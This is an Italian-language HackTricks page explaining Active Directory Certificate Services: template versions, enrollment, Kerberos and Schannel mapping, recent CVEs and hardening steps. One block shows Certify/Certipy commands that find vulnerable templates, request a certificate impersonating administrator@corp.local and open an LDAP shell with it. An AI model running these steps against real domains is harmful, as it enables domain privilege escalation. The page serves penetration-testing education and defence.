# AD Certificates

{{#include ../../banners/hacktricks-training.md}}

## Introduzione

### Componenti di un Certificate

- Il **Subject** del certificate indica il suo proprietario.
- Una **Public Key** è associata a una chiave detenuta privatamente per collegare il certificate al suo legittimo proprietario.
- Il **Validity Period**, definito dalle date **NotBefore** e **NotAfter**, indica la durata effettiva del certificate.
- Un **Serial Number** univoco, fornito dalla Certificate Authority (CA), identifica ogni certificate.
- L'**Issuer** si riferisce alla CA che ha emesso il certificate.
- **SubjectAlternativeName** consente nomi aggiuntivi per il subject, migliorando la flessibilità dell'identificazione.
- **Basic Constraints** identificano se il certificate è per una CA o per un end entity e definiscono le restrizioni d'uso.
- **Extended Key Usages (EKUs)** delineano gli scopi specifici del certificate, come code signing o email encryption, tramite Object Identifiers (OIDs).
- Il **Signature Algorithm** specifica il metodo per firmare il certificate.
- La **Signature**, creata con la chiave privata dell'issuer, garantisce l'autenticità del certificate.

### Considerazioni speciali

- I **Subject Alternative Names (SANs)** ampliano l'applicabilità di un certificate a più identità, fondamentale per server con più domini. Processi di emissione sicuri sono vitali per evitare rischi di impersonation da parte di attacker che manipolano la specifica SAN.

### Certificate Authorities (CAs) in Active Directory (AD)

AD CS riconosce i certificate CA in una AD forest tramite container dedicati, ognuno con ruoli specifici:

- Il container **Certification Authorities** contiene i trusted root CA certificates.
- Il container **Enrolment Services** dettaglia le Enterprise CAs e i loro certificate templates.
- L'oggetto **NTAuthCertificates** include i certificate CA autorizzati per l'autenticazione AD.
- Il container **AIA (Authority Information Access)** facilita la validazione della certificate chain con intermediate e cross CA certificates.

### Acquisizione del Certificate: flusso di richiesta di un client certificate

1. Il processo di richiesta inizia con i client che individuano una Enterprise CA.
2. Viene creato un CSR, contenente una public key e altri dettagli, dopo aver generato una coppia di chiavi public-private.
3. La CA valuta il CSR rispetto ai certificate templates disponibili, emettendo il certificate in base ai permessi del template.
4. Dopo l'approvazione, la CA firma il certificate con la sua chiave privata e lo restituisce al client.

### Certificate Templates

Definiti all'interno di AD, questi template descrivono le impostazioni e i permessi per l'emissione dei certificate, inclusi gli EKUs consentiti e i diritti di enrollment o modifica, fondamentali per gestire l'accesso ai certificate services.

**La versione dello schema del template conta.** I legacy template **v1** (per esempio, il template integrato **WebServer**) non hanno diversi moderni controlli di enforcement. La ricerca **ESC15/EKUwu** ha mostrato che sui **template v1**, un requester può incorporare **Application Policies/EKUs** nel CSR che sono **preferred over** gli EKUs configurati nel template, consentendo certificate client-auth, enrollment agent o code-signing con soli diritti di enrollment. Preferire i **template v2/v3**, rimuovere o sostituire i default v1, e limitare strettamente gli EKUs allo scopo previsto.

## Certificate Enrollment

Il processo di enrollment per i certificate è avviato da un administrator che **crea un certificate template**, che viene poi **published** da una Enterprise Certificate Authority (CA). Questo rende il template disponibile per l'enrollment del client, un passaggio ottenuto aggiungendo il nome del template al campo `certificatetemplates` di un oggetto Active Directory.

Per consentire a un client di richiedere un certificate, devono essere concessi i **enrollment rights**. Questi diritti sono definiti da security descriptors sul certificate template e sulla Enterprise CA stessa. I permessi devono essere concessi in entrambe le posizioni perché la richiesta abbia successo.

### Template Enrollment Rights

Questi diritti sono specificati tramite Access Control Entries (ACEs), dettagliando permessi come:

- Diritti **Certificate-Enrollment** e **Certificate-AutoEnrollment**, ciascuno associato a GUID specifici.
- **ExtendedRights**, che consentono tutti i permessi estesi.
- **FullControl/GenericAll**, che forniscono il controllo completo sul template.

### Enterprise CA Enrollment Rights

I diritti della CA sono definiti nel suo security descriptor, accessibile tramite la console di gestione della Certificate Authority. Alcune impostazioni consentono persino l'accesso remoto a utenti low-privileged, il che può rappresentare un problema di sicurezza.

### Additional Issuance Controls

Alcuni controlli possono applicarsi, come:

- **Manager Approval**: inserisce le richieste in stato pending finché non vengono approvate da un certificate manager.
- **Enrolment Agents and Authorized Signatures**: specificano il numero di firme richieste su un CSR e i necessari Application Policy OIDs.

### Methods to Request Certificates

I certificate possono essere richiesti tramite:

1. **Windows Client Certificate Enrollment Protocol** (MS-WCCE), usando interfacce DCOM.
2. **ICertPassage Remote Protocol** (MS-ICPR), tramite named pipes o TCP/IP.
3. L'**certificate enrollment web interface**, con il ruolo Certificate Authority Web Enrollment installato.
4. Il **Certificate Enrollment Service** (CES), in combinazione con il servizio Certificate Enrollment Policy (CEP).
5. Il **Network Device Enrollment Service** (NDES) per network devices, usando il Simple Certificate Enrollment Protocol (SCEP).

Gli utenti Windows possono anche richiedere certificate tramite la GUI (`certmgr.msc` o `certlm.msc`) o strumenti da command-line (`certreq.exe` o il comando PowerShell `Get-Certificate`).
```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```
## Autenticazione tramite certificato

Active Directory (AD) supporta l'autenticazione tramite certificato, utilizzando principalmente i protocolli **Kerberos** e **Secure Channel (Schannel)**.

### Processo di autenticazione Kerberos

Nel processo di autenticazione Kerberos, la richiesta di un utente per un Ticket Granting Ticket (TGT) viene firmata usando la **private key** del certificato dell'utente. Questa richiesta viene sottoposta a diverse validazioni da parte del domain controller, incluse la **validità**, il **path** e lo **stato di revoca** del certificato. Le validazioni includono anche la verifica che il certificato provenga da una fonte trusted e la conferma della presenza dell'issuer nello **store NTAUTH certificate**. Se le validazioni hanno esito positivo, viene emesso un TGT. L'oggetto **`NTAuthCertificates`** in AD, trovato in:
```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```
è centrale per stabilire la trust per certificate authentication.

Da KB5014754 rollout, la moderna Kerberos certificate auth riguarda soprattutto il **mapping strength**, non solo gli EKU. In hardened forests:

- Un certificate che contiene solo un **UPN/DNS SAN** può non essere più sufficiente per il logon.
- Il KDC preferisce un **strong binding**, tipicamente la **SID security extension** (`1.3.6.1.4.1.311.25.2`) oppure un strong explicit mapping in `altSecurityIdentities`.
- Se il cert non ha un strong mapping, i DC registrano **Kdcsvc Event ID 39/41** in compatibility mode e negano auth in enforcement mode.
- In mixed attack paths, **ESC9/ESC16** sono importanti perché rimuovono la SID extension dai cert emessi; gli operatori allora si basano su explicit mappings o su formati SAN URL SID dove l'attack path li supporta.

### Secure Channel (Schannel) Authentication

Schannel facilita connessioni TLS/SSL sicure, dove durante un handshake il client presenta un certificate che, se validato con successo, autorizza l’accesso. Il mapping di un certificate a un account AD può coinvolgere la funzione **S4U2Self** di Kerberos o il **Subject Alternative Name (SAN)** del certificate, tra gli altri metodi.

Schannel è anche il fallback pratico quando **PKINIT** non è disponibile. Per esempio, se un domain controller non ha un certificate adatto per **Smart Card Logon**, gli strumenti `certipy auth`/PKINIT possono fallire nel ottenere un TGT, ma lo stesso certificate può comunque essere usabile contro **LDAPS** o **LDAP StartTLS** per authentication e operazioni LDAP.

### AD Certificate Services Enumeration

I certificate services di AD possono essere enumerati tramite query LDAP, rivelando informazioni sulle **Enterprise Certificate Authorities (CAs)** e sulle loro configurazioni. Questo è accessibile a qualsiasi user autenticato nel domain senza privilegi speciali. Tool come **[Certify](https://github.com/GhostPack/Certify)** e **[Certipy](https://github.com/ly4k/Certipy)** sono usati per enumeration e vulnerability assessment negli ambienti AD CS.

I commands per usare questi tool includono:
```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```
{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

---

## Vulnerabilità recenti e aggiornamenti di sicurezza (2022-2025)

| Year | ID / Name | Impact | Key-takeaways |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – “Certifried” / ESC6 | *Privilege escalation* tramite spoofing dei certificati dell’account macchina durante PKINIT. | La patch è inclusa negli aggiornamenti di sicurezza del **10 May 2022**. L’auditing e i controlli strong-mapping sono stati introdotti tramite **KB5014754**; gli ambienti dovrebbero ora essere in modalità *Full Enforcement*.  |
| 2023 | **CVE-2023-35350 / 35351** | *Remote code-execution* nei ruoli AD CS Web Enrollment (certsrv) e CES. | I PoC pubblici sono limitati, ma i componenti IIS vulnerabili sono spesso esposti internamente. Patch disponibile con il Patch Tuesday di **July 2023**.  |
| 2024 | **CVE-2024-49019** – “EKUwu” / ESC15 | Su template **v1**, un requester con diritti di enrollment può incorporare **Application Policies/EKUs** nel CSR che hanno priorità sugli EKU del template, producendo certificati client-auth, enrollment agent o code-signing. | Patch disponibile dal **November 12, 2024**. Sostituisci o depreca i template v1 (ad es. il default WebServer), limita gli EKU all’intento previsto e riduci i diritti di enrollment. |

### Microsoft hardening timeline (KB5014754)

Microsoft ha introdotto un rollout in tre fasi (Compatibility → Audit → Enforcement) per spostare l’autenticazione Kerberos basata su certificati lontano dai weak implicit mappings. A partire dall’**February 11, 2025**, i domain controller passano automaticamente a **Full Enforcement** se il valore di registro `StrongCertificateBindingEnforcement` non è impostato. Microsoft ha poi aggiornato la timeline in modo che il fallback alla modalità compatibility resti possibile fino all’aggiornamento di sicurezza del **September 9, 2025**. Gli amministratori dovrebbero:

1. Patch tutti i DC e i server AD CS (May 2022 o successivi).
2. Monitorare Event ID 39/41 per weak mappings durante la fase *Audit*.
3. Reemettere i certificati client-auth con la nuova **SID extension** oppure configurare strong manual mappings prima che l’enforcement blocchi i weak mappings.

### Note operative per forest hardenizzate

- **ESC1/ESC6 da sole non sono più tutta la storia** negli ambienti 2025+. Se richiedi un cert per un altro principal, di solito serve anche un forte mapping artifact come la SID extension o un mapping esplicito.
- **ESC15 (EKUwu)** è soprattutto utile in ambienti non patchati perché trasforma template **v1** innocui come **WebServer** in cert capaci di autenticazione o enrollment-agent grazie all’iniezione di **Application Policies**. Kerberos PKINIT valuta ancora gli EKU, ma anche **LDAP Schannel** riconosce le Application Policies, mantenendo rilevante l’abuso basato su LDAP.
- **ESC16** è un toggle a livello CA: se la CA disabilita globalmente la SID security extension, ogni certificato emesso tende a tornare verso un comportamento di mapping più debole, a meno che la chain di attacco non inietti una SID con un altro formato supportato.

---

## Miglioramenti di rilevamento e hardening

* **Defender for Identity AD CS sensor (2023-2024)** ora mostra valutazioni di posture per ESC1-ESC8/ESC11 e genera alert in tempo reale come *“Domain-controller certificate issuance for a non-DC”* (ESC8) e *“Prevent Certificate Enrollment with arbitrary Application Policies”* (ESC15). Assicurati che i sensor siano distribuiti su tutti i server AD CS per beneficiare di questi rilevamenti.
* Disabilita o limita strettamente l’opzione **“Supply in the request”** su tutti i template; preferisci valori SAN/EKU definiti esplicitamente.
* Rimuovi **Any Purpose** o **No EKU** dai template, a meno che non sia assolutamente necessario (copre scenari ESC2).
* Richiedi **manager approval** o workflow dedicati di Enrollment Agent per template sensibili (ad es. WebServer / CodeSigning).
* Limita gli endpoint di web enrollment (`certsrv`) e CES/NDES alle reti fidate o dietro autenticazione con client certificate.
* Imposta la encryption per l’enrollment RPC (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`) per mitigare ESC11 (RPC relay). Il flag è **attivo di default**, ma spesso viene disabilitato per client legacy, riaprendo il rischio di relay.
* Metti in sicurezza gli **IIS-based enrollment endpoints** (CES/Certsrv): disabilita NTLM dove possibile oppure richiedi HTTPS + Extended Protection per bloccare i relay ESC8.

---



## References

- [https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../banners/hacktricks-training.md}}
